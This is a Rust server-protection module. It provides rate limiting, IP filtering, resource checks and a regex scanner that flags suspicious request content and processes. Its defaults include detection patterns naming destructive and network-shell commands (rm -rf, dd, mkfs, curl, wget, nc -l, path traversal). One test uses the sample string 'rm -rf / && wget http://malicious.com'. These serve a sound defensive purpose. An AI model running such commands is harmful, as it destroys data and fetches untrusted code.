use governor::{Quota, RateLimiter};
use governor::state::direct::NotKeyed;
use log::{error, warn};
#[cfg(unix)]
use nix::sys::signal::{self, Signal};
#[cfg(unix)]
use nix::unistd::Pid;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::IpAddr;
use std::num::NonZeroU32;
use std::sync::Arc;
use std::time::Duration;
use sysinfo::{CpuExt, DiskExt, PidExt, ProcessExt, System, SystemExt};
use thiserror::Error;
use tokio::sync::RwLock;

#[derive(Error, Debug)]
pub enum ProtectionError {
    #[error("Rate limit exceeded for IP: {0}")]
    RateLimitExceeded(String),
    #[error("Resource usage too high: {resource} at {usage}%")]
    ResourceUsageHigh { resource: String, usage: f32 },
    #[error("Suspicious activity detected: {0}")]
    SuspiciousActivity(String),
    #[error("Process monitoring failed: {0}")]
    ProcessMonitorError(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtectionConfig {
    pub rate_limit_requests: u32,
    pub rate_limit_window: Duration,
    pub max_cpu_usage: f32,
    pub max_memory_usage: f32,
    pub max_disk_usage: f32,
    pub suspicious_patterns: Vec<String>,
    pub allowed_ips: Vec<IpAddr>,
    pub blocked_ips: Vec<IpAddr>,
    pub enable_process_monitoring: bool,
    pub auto_kill_suspicious: bool,
}

impl Default for ProtectionConfig {
    fn default() -> Self {
        Self {
            rate_limit_requests: 100,
            rate_limit_window: Duration::from_secs(60),
            max_cpu_usage: 80.0,
            max_memory_usage: 85.0,
            max_disk_usage: 90.0,
            suspicious_patterns: vec![
                r"(?i)(rm\s+-rf|dd\s+if=|mkfs|format)".to_string(),
                r"(?i)(sudo\s+su|chmod\s+777|chown\s+root)".to_string(),
                r"(?i)(wget\s+http|curl\s+http|nc\s+-l)".to_string(),
                r"(?i)(\.\./\.\.|\.\.\/|%2e%2e%2f)".to_string(),
            ],
            allowed_ips: vec![],
            blocked_ips: vec![],
            enable_process_monitoring: true,
            auto_kill_suspicious: false,
        }
    }
}

type RateLimiterMap = HashMap<String, Arc<RateLimiter<NotKeyed, governor::state::InMemoryState, governor::clock::QuantaClock>>>;

#[derive(Debug, Clone)]
pub struct ServerProtection {
    config: ProtectionConfig,
    rate_limiters: Arc<RwLock<RateLimiterMap>>,
    suspicious_regexes: Vec<Regex>,
    system: Arc<RwLock<System>>,
}

impl ServerProtection {
    pub fn new(config: ProtectionConfig) -> Result<Self, ProtectionError> {
        let mut suspicious_regexes = Vec::new();
        for pattern in &config.suspicious_patterns {
            match Regex::new(pattern) {
                Ok(regex) => suspicious_regexes.push(regex),
                Err(e) => {
                    error!("Failed to compile suspicious pattern '{}': {}", pattern, e);
                    return Err(ProtectionError::ProcessMonitorError(format!(
                        "Regex compilation failed: {}", e
                    )));
                }
            }
        }

        Ok(Self {
            config,
            rate_limiters: Arc::new(RwLock::new(HashMap::new())),
            suspicious_regexes,
            system: Arc::new(RwLock::new(System::new_all())),
        })
    }

    pub async fn check_rate_limit(&self, ip: &str) -> Result<(), ProtectionError> {
        let mut limiters = self.rate_limiters.write().await;
        
        let limiter = limiters.entry(ip.to_string()).or_insert_with(|| {
            let quota = Quota::per_minute(NonZeroU32::new(self.config.rate_limit_requests.max(1)).unwrap());
            Arc::new(RateLimiter::direct_with_clock(quota, &governor::clock::QuantaClock::default()))
        });

        if limiter.check().is_err() {
            warn!("Rate limit exceeded for IP: {}", ip);
            return Err(ProtectionError::RateLimitExceeded(ip.to_string()));
        }

        Ok(())
    }

    pub fn check_ip_allowed(&self, ip: &IpAddr) -> bool {
        if self.config.blocked_ips.contains(ip) {
            return false;
        }
        
        if self.config.allowed_ips.is_empty() {
            return true;
        }
        
        self.config.allowed_ips.contains(ip)
    }

    pub fn scan_for_suspicious_content(&self, content: &str) -> Vec<String> {
        let mut matches = Vec::new();
        
        for regex in &self.suspicious_regexes {
            for cap in regex.find_iter(content) {
                matches.push(cap.as_str().to_string());
            }
        }
        
        matches
    }

    pub async fn check_system_resources(&self) -> Result<(), ProtectionError> {
        if !self.config.enable_process_monitoring {
            return Ok(());
        }

        let mut system = self.system.write().await;
        system.refresh_all();

        let cpu_usage = system.global_cpu_info().cpu_usage();
        if cpu_usage > self.config.max_cpu_usage {
            error!("CPU usage too high: {}%", cpu_usage);
            return Err(ProtectionError::ResourceUsageHigh {
                resource: "CPU".to_string(),
                usage: cpu_usage,
            });
        }

        let total_memory = system.total_memory();
        let used_memory = system.used_memory();
        let memory_usage = (used_memory as f32 / total_memory as f32) * 100.0;
        
        if memory_usage > self.config.max_memory_usage {
            error!("Memory usage too high: {}%", memory_usage);
            return Err(ProtectionError::ResourceUsageHigh {
                resource: "Memory".to_string(),
                usage: memory_usage,
            });
        }

        let (total_disk, available_disk) = Self::get_disk_usage(&system);
        let disk_usage = if total_disk > 0 {
            ((total_disk - available_disk) as f32 / total_disk as f32) * 100.0
        } else {
            0.0
        };
            
        if disk_usage > self.config.max_disk_usage {
            error!("Disk usage too high: {}%", disk_usage);
            return Err(ProtectionError::ResourceUsageHigh {
                resource: "Disk".to_string(),
                usage: disk_usage,
            });
        }

        Ok(())
    }

    pub async fn monitor_suspicious_processes(&self) -> Result<Vec<SuspiciousProcess>, ProtectionError> {
        if !self.config.enable_process_monitoring {
            return Ok(vec![]);
        }

        let mut system = self.system.write().await;
        system.refresh_processes();

        let mut suspicious_processes = Vec::new();

        for (pid, process) in system.processes() {
            let name = process.name();
            let cmd = process.cmd().join(" ");
            
            if self.is_suspicious_process(name, &cmd) {
                let pid_u32 = pid.as_u32();
                let suspicious = SuspiciousProcess {
                    pid: pid_u32,
                    name: name.to_string(),
                    command: cmd,
                    cpu_usage: process.cpu_usage(),
                    memory_usage: process.memory(),
                    start_time: process.start_time(),
                };

                suspicious_processes.push(suspicious);

                if self.config.auto_kill_suspicious {
                    warn!("Auto-killing suspicious process: {} (PID: {})", name, pid);
                    #[cfg(unix)]
                    if let Err(e) = signal::kill(Pid::from_raw(pid_u32 as i32), Signal::SIGTERM) {
                        error!("Failed to kill process {}: {}", pid, e);
                    }
                }
            }
        }

        Ok(suspicious_processes)
    }

    fn is_suspicious_process(&self, name: &str, command: &str) -> bool {
        let suspicious_names = vec![
            "nc", "netcat", "nmap", "wireshark", "tcpdump",
            "iptables", "ufw", "firewall", "dd", "shred",
            "cryptsetup", "losetup", "mount", "umount",
        ];

        if suspicious_names.iter().any(|&s| name.contains(s)) {
            return true;
        }

        for regex in &self.suspicious_regexes {
            if regex.is_match(command) {
                return true;
            }
        }

        false
    }

    pub async fn get_protection_stats(&self) -> ProtectionStats {
        let mut system = self.system.write().await;
        system.refresh_all();

        let rate_limiter_count = self.rate_limiters.read().await.len();

        let (total_disk, available_disk) = Self::get_disk_usage(&system);
        let disk_usage = if total_disk > 0 {
            ((total_disk - available_disk) as f32 / total_disk as f32) * 100.0
        } else {
            0.0
        };

        ProtectionStats {
            active_rate_limiters: rate_limiter_count,
            cpu_usage: system.global_cpu_info().cpu_usage(),
            memory_usage: (system.used_memory() as f32 / system.total_memory() as f32) * 100.0,
            disk_usage,
            process_count: system.processes().len(),
        }
    }

    fn get_disk_usage(system: &System) -> (u64, u64) {
        let mut total = 0u64;
        let mut available = 0u64;

        for disk in system.disks() {
            total = total.saturating_add(disk.total_space());
            available = available.saturating_add(disk.available_space());
        }

        (total, available)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuspiciousProcess {
    pub pid: u32,
    pub name: String,
    pub command: String,
    pub cpu_usage: f32,
    pub memory_usage: u64,
    pub start_time: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtectionStats {
    pub active_rate_limiters: usize,
    pub cpu_usage: f32,
    pub memory_usage: f32,
    pub disk_usage: f32,
    pub process_count: usize,
}

pub struct ProtectionMiddleware {
    protection: Arc<ServerProtection>,
}

impl ProtectionMiddleware {
    pub fn new(protection: Arc<ServerProtection>) -> Self {
        Self { protection }
    }

    pub async fn check_request(&self, ip: &str, content: &str) -> Result<(), ProtectionError> {
        let ip_addr: IpAddr = ip.parse().unwrap_or_else(|_| "127.0.0.1".parse().unwrap());
        
        if !self.protection.check_ip_allowed(&ip_addr) {
            return Err(ProtectionError::SuspiciousActivity(format!(
                "Blocked IP address: {}", ip
            )));
        }

        self.protection.check_rate_limit(ip).await?;

        let suspicious = self.protection.scan_for_suspicious_content(content);
        if !suspicious.is_empty() {
            warn!("Suspicious content detected from {}: {:?}", ip, suspicious);
            return Err(ProtectionError::SuspiciousActivity(format!(
                "Suspicious patterns detected: {:?}", suspicious
            )));
        }

        self.protection.check_system_resources().await?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_rate_limiting() {
        let config = ProtectionConfig::default();
        let rate_limit_requests = config.rate_limit_requests;
        let protection = ServerProtection::new(config).unwrap();
        
        let ip = "127.0.0.1";
        
        for _ in 0..rate_limit_requests {
            assert!(protection.check_rate_limit(ip).await.is_ok());
        }
        
        assert!(protection.check_rate_limit(ip).await.is_err());
    }

    #[test]
    fn test_suspicious_content_detection() {
        let config = ProtectionConfig::default();
        let protection = ServerProtection::new(config).unwrap();
        
        let content = "rm -rf / && wget http://malicious.com";
        let suspicious = protection.scan_for_suspicious_content(content);
        
        assert!(!suspicious.is_empty());
    }

    #[test]
    fn test_ip_filtering() {
        let mut config = ProtectionConfig::default();
        config.blocked_ips.push("192.168.1.100".parse().unwrap());
        
        let protection = ServerProtection::new(config).unwrap();
        
        assert!(!protection.check_ip_allowed(&"192.168.1.100".parse().unwrap()));
        assert!(protection.check_ip_allowed(&"192.168.1.1".parse().unwrap()));
    }
}
